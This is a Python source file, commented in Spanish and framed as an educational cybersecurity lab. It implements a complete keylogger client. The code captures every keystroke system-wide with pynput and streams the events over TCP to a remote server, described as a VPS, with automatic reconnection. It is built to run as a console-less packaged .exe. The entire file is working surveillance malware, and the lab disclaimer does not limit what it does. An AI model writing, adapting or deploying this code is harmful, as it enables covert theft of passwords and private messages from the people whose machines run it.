#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
client.py — Laboratorio educativo de ciberseguridad.

Captura eventos de teclado del sistema donde se ejecuta y los transmite
por TCP al servidor de análisis.

USO EXCLUSIVO EN LABORATORIO CONTROLADO Y CON FINES DEFENSIVOS/DIDÁCTICOS.

Configuración (prioridad: CLI > variables de entorno > cliente.ini > defaults):
    LAB_SERVER_IP        IP del servidor        (default <IP_PUBLICA>)
    LAB_SERVER_PORT      Puerto TCP             (default <PUERTO_PUBLICO>)
    LAB_FLUSH_INTERVAL   Segundos entre envíos  (default 2.0)
    LAB_LOG_LEVEL        DEBUG|INFO|WARNING|ERROR (default INFO)
    LAB_LOG_FILE         Ruta del log           (default: junto al script/.exe)

Argumentos CLI:
    --ip, --port, --interval

Fichero opcional "cliente.ini" en la misma carpeta que el .exe/.py:
    Formato clave=valor, una por línea, # para comentarios.
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import pathlib
import queue
import signal
import socket
import sys
import threading
import time
import traceback
from dataclasses import dataclass
from typing import Optional

try:
    from pynput import keyboard  # type: ignore
except ImportError:
    print("Falta la dependencia 'pynput'. Instálala con: pip install pynput",
          file=sys.stderr)
    raise


# ---------------------------------------------------------------------------
# 0. Rutas base (funciona como .py y como .exe empaquetado con PyInstaller)
# ---------------------------------------------------------------------------
def _base_dir() -> pathlib.Path:
    """Carpeta donde vive el .exe (o el .py si corremos como script)."""
    if getattr(sys, "frozen", False):
        return pathlib.Path(sys.executable).parent
    return pathlib.Path(__file__).resolve().parent


BASE_DIR = _base_dir()


# ---------------------------------------------------------------------------
# 1. Hook de crash (para --noconsole: sin consola no hay stderr visible)
# ---------------------------------------------------------------------------
def _crash_hook(exc_type, exc, tb) -> None:
    try:
        (BASE_DIR / "cliente_crash.log").write_text(
            "".join(traceback.format_exception(exc_type, exc, tb)),
            encoding="utf-8",
        )
    except Exception:
        pass
    if sys.stderr is not None:
        sys.__excepthook__(exc_type, exc, tb)


# ---------------------------------------------------------------------------
# 2. Configuración
# ---------------------------------------------------------------------------
# Defaults del laboratorio: apunta al VPS por defecto.
DEFAULT_SERVER_IP = "<IP_PUBLICA>"
DEFAULT_SERVER_PORT = <PUERTO_PUBLICO>


@dataclass(frozen=True)
class Config:
    server_ip: str
    server_port: int
    flush_interval: float
    log_level: str
    log_file: str

    @staticmethod
    def from_env_and_args() -> "Config":
        """
        Prioridad: CLI > env del sistema > cliente.ini > defaults del código.
        El .ini se carga con os.environ.setdefault, así que nunca pisa
        variables de entorno ya definidas en el sistema.
        """
        # 0) Carga cliente.ini si existe junto al .exe/.py (opcional).
        ini_path = BASE_DIR / "cliente.ini"
        if ini_path.exists():
            try:
                for raw in ini_path.read_text(encoding="utf-8").splitlines():
                    line = raw.strip()
                    if not line or line.startswith("#") or "=" not in line:
                        continue
                    k, v = line.split("=", 1)
                    os.environ.setdefault(k.strip(), v.strip())
            except OSError:
                pass

        parser = argparse.ArgumentParser(
            description="Cliente de captura de teclado para laboratorio."
        )
        parser.add_argument("--ip", help="IP del servidor")
        parser.add_argument("--port", type=int, help="Puerto TCP del servidor")
        parser.add_argument("--interval", type=float, help="Segundos entre envíos")
        args = parser.parse_args()

        ip = args.ip or os.getenv("LAB_SERVER_IP", DEFAULT_SERVER_IP)
        port = args.port or int(os.getenv("LAB_SERVER_PORT", str(DEFAULT_SERVER_PORT)))
        interval = args.interval or float(os.getenv("LAB_FLUSH_INTERVAL", "2.0"))
        level = os.getenv("LAB_LOG_LEVEL", "INFO").upper()
        log_file = os.getenv("LAB_LOG_FILE", str(BASE_DIR / "cliente.log"))

        return Config(ip, port, interval, level, log_file)


# ---------------------------------------------------------------------------
# 3. Logging
# ---------------------------------------------------------------------------
def setup_logging(level: str, log_file: str) -> logging.Logger:
    logger = logging.getLogger("cliente")
    logger.setLevel(getattr(logging, level, logging.INFO))

    for h in list(logger.handlers):
        logger.removeHandler(h)

    fmt = logging.Formatter(
        "%(asctime)s | %(levelname)-7s | %(threadName)-10s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(fmt)
    logger.addHandler(fh)

    # Consola solo si existe y es TTY.
    if sys.stderr is not None and getattr(sys.stderr, "isatty", lambda: False)():
        sh = logging.StreamHandler(sys.stderr)
        sh.setFormatter(fmt)
        logger.addHandler(sh)

    return logger


# ---------------------------------------------------------------------------
# 4. Captura de teclado (productor)
# ---------------------------------------------------------------------------
class KeyboardCapture:
    """
    Envuelve pynput y publica eventos en una cola.

    Por qué una cola: el callback de pynput corre en el hilo del hook del SO.
    Hacer I/O de red ahí dentro bloquearía el hook y se notaría en la VM
    (latencia al teclear). Un productor/consumidor desacopla captura y envío.
    """

    def __init__(self, out_queue: "queue.Queue[dict]", logger: logging.Logger):
        self._q = out_queue
        self._log = logger
        self._listener: Optional[keyboard.Listener] = None

    def _emit(self, kind: str, key: object) -> None:
        try:
            if isinstance(key, keyboard.KeyCode):
                payload = {"kind": kind, "value": key.char}
            else:
                payload = {"kind": kind, "value": str(key).replace("Key.", "")}
        except Exception as exc:  # noqa: BLE001
            payload = {"kind": kind, "value": f"<error:{exc}>"}
        payload["ts"] = time.time()
        try:
            self._q.put_nowait(payload)
        except queue.Full:
            self._log.warning("Cola llena, descartando evento")

    def start(self) -> None:
        self._listener = keyboard.Listener(
            on_press=lambda k: self._emit("press", k),
            on_release=lambda k: self._emit("release", k),
        )
        self._listener.daemon = True
        self._listener.start()
        self._log.info("Captura de teclado iniciada")

    def stop(self) -> None:
        if self._listener:
            try:
                self._listener.stop()
            except Exception:  # noqa: BLE001
                pass
            self._log.info("Captura de teclado detenida")


# ---------------------------------------------------------------------------
# 5. Envío por TCP (consumidor)
# ---------------------------------------------------------------------------
class TcpSender(threading.Thread):
    """
    Hilo consumidor: drena la cola por lotes y los envía por TCP.
    Protocolo: un JSON por línea (NDJSON) terminado en '\\n'.
    Reconexión con backoff exponencial acotado.
    """

    def __init__(
        self,
        cfg: Config,
        in_queue: "queue.Queue[dict]",
        stop_event: threading.Event,
        logger: logging.Logger,
    ):
        super().__init__(name="TcpSender", daemon=True)
        self._cfg = cfg
        self._q = in_queue
        self._stop = stop_event
        self._log = logger

    def _connect(self) -> socket.socket:
        delay = 1.0
        while not self._stop.is_set():
            try:
                s = socket.create_connection(
                    (self._cfg.server_ip, self._cfg.server_port), timeout=5.0
                )
                s.settimeout(5.0)
                self._log.info("Conectado a %s:%d",
                               self._cfg.server_ip, self._cfg.server_port)
                return s
            except OSError as exc:
                self._log.warning("Conexión fallida (%s). Reintento en %.1fs", exc, delay)
                self._stop.wait(delay)
                delay = min(delay * 2, 30.0)
        raise RuntimeError("Detenido antes de conectar")

    def run(self) -> None:
        sock: Optional[socket.socket] = None
        try:
            sock = self._connect()
            while not self._stop.is_set():
                batch = self._drain_batch(self._cfg.flush_interval)
                if not batch:
                    continue
                try:
                    for ev in batch:
                        line = json.dumps(ev, ensure_ascii=False) + "\n"
                        sock.sendall(line.encode("utf-8"))
                        self._log.debug("Enviado: %s", ev)
                except OSError as exc:
                    self._log.error("Error de envío: %s. Reconectando…", exc)
                    try:
                        sock.close()
                    except OSError:
                        pass
                    sock = self._connect()
        except Exception as exc:  # noqa: BLE001
            self._log.exception("Hilo emisor abortado: %s", exc)
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
            self._log.info("Hilo emisor finalizado")

    def _drain_batch(self, timeout: float) -> list[dict]:
        """Espera hasta `timeout`s y devuelve lo que haya en la cola."""
        batch: list[dict] = []
        try:
            first = self._q.get(timeout=timeout)
            batch.append(first)
        except queue.Empty:
            return batch
        while True:
            try:
                batch.append(self._q.get_nowait())
            except queue.Empty:
                break
        return batch


# ---------------------------------------------------------------------------
# 6. Orquestación y cierre limpio
# ---------------------------------------------------------------------------
class ClientApp:
    def __init__(self, cfg: Config, logger: logging.Logger):
        self._cfg = cfg
        self._log = logger
        self._q: "queue.Queue[dict]" = queue.Queue(maxsize=10_000)
        self._stop = threading.Event()
        self._capture = KeyboardCapture(self._q, logger)
        self._sender = TcpSender(cfg, self._q, self._stop, logger)

    def _install_signal_handlers(self) -> None:
        def handler(signum, _frame):
            self._log.info("Señal %s recibida. Cerrando…", signum)
            self._stop.set()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, handler)
            except (ValueError, OSError):
                pass

    def run(self) -> int:
        self._install_signal_handlers()
        self._capture.start()
        self._sender.start()
        self._log.info("Cliente en marcha → %s:%d (intervalo %.1fs)",
                       self._cfg.server_ip, self._cfg.server_port,
                       self._cfg.flush_interval)
        try:
            while not self._stop.is_set():
                self._stop.wait(1.0)
        finally:
            self._capture.stop()
            self._stop.set()
            self._sender.join(timeout=5.0)
            self._log.info("Cliente detenido correctamente")
        return 0


# ---------------------------------------------------------------------------
# 7. Entry point
# ---------------------------------------------------------------------------
def main() -> int:
    # 1) Hook de crash ANTES que nada.
    sys.excepthook = _crash_hook

    # 2) Logging "bootstrap" lo antes posible, para que CUALQUIER fallo quede registrado.
    bootstrap_log = BASE_DIR / "cliente.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)-7s | %(threadName)-10s | %(message)s",
        handlers=[logging.FileHandler(bootstrap_log, encoding="utf-8")],
    )
    logging.getLogger("cliente").info("=== Arranque del cliente ===")

    # 3) Configuración y logging definitivo.
    try:
        cfg = Config.from_env_and_args()
    except SystemExit as exc:
        logging.getLogger("cliente").error("Config inválida: %s", exc)
        raise
    except Exception as exc:  # noqa: BLE001
        logging.getLogger("cliente").exception("Error leyendo configuración: %s", exc)
        return 2

    logger = setup_logging(cfg.log_level, cfg.log_file)
    logger.info("Config: ip=%s port=%d interval=%.1fs",
                cfg.server_ip, cfg.server_port, cfg.flush_interval)

    # 4) Arrancar la app.
    return ClientApp(cfg, logger).run()


if __name__ == "__main__":
    sys.exit(main())